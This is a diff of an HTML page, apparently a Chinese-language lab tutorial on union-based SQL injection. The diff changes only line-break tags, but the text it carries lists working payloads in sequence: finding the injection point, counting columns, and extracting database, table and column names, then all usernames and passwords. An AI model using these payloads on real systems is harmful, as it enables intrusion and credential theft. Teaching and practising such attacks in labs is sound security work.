@@ -225,12 +225,12 @@
 <p><code>?id=1' and 1=2 --+</code>
 页面不正常显示，说明程序对我们的输入做出了正确的判断，所以注入点就是单引号</p>
 <h2 id="判断当前表的字段个数">3. 判断当前表的字段个数</h2>
-<p><code>?id=1 order by 3 --+</code><br>
+<p><code>?id=1 order by 3 --+</code><br />
 <code>?id=1 order by 4 --+</code>
 ,此时显示未知的列，说明此时当前表中只有3列</p>
 <h2 id="判断显示位">4. 判断显示位</h2>
-<p>上面我们判断出来了表中有3列，接下来判断我们的输入会在屏幕哪个地方进行回显<br>
-<code>?id=-1' union select 1,2,3 --+</code><br>
+<p>上面我们判断出来了表中有3列，接下来判断我们的输入会在屏幕哪个地方进行回显<br />
+<code>?id=-1' union select 1,2,3 --+</code><br />
 让union select前面的参数查不出来，所以id=-1'</p>
 <p>如下，在name和password中回显了我们的输入，这时我们就随便选一个地方来放置接下来的测试语句。</p>
 <h2 id="爆数据库名字">5. 爆数据库名字</h2>
@@ -239,11 +239,11 @@
 <p><code>?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code>
 其中爆出来数据库中存在三个表</p>
 <h2 id="爆表中的字段">7. 爆表中的字段</h2>
-<p>我们这里选择一个表，users进行进一步的获取表中的字段值<br>
-<code>?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+</code><br>
+<p>我们这里选择一个表，users进行进一步的获取表中的字段值<br />
+<code>?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+</code><br />
 获取到三个字段，分别为id,username,password</p>
 <h2 id="爆相应字段的所有数据">8. 爆相应字段的所有数据</h2>
-<p><code>?id=-1' union select 1,group_concat(id,'--',username,'--',password),3 from users --+</code><br>
+<p><code>?id=-1' union select 1,group_concat(id,'--',username,'--',password),3 from users --+</code><br />
 至此，一次完整的脱库过程结束了，联合查询也就结束了。</p>
 
     </div>
